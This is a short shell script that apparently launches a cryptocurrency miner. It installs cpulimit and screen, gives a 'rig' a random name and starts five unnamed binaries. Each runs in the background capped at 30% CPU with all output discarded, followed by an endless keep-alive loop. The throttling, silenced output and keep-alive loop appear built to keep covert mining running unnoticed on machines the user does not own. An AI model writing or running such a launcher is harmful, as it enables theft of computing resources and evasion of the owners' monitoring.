hostname=$(shuf -n 1 -i 1-9999999)
apt-get update -y
apt-get install -y cpulimit screen
chmod +x p1
chmod +x p2
chmod +x p3
chmod +x p4
chmod +x p5
chmod +x config.json
sed -i "s/RIGNAME/$hostname/" "sc2.py"
cpulimit -l 30 ./p1 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./p2 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./p3 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./p4 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./p5 >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
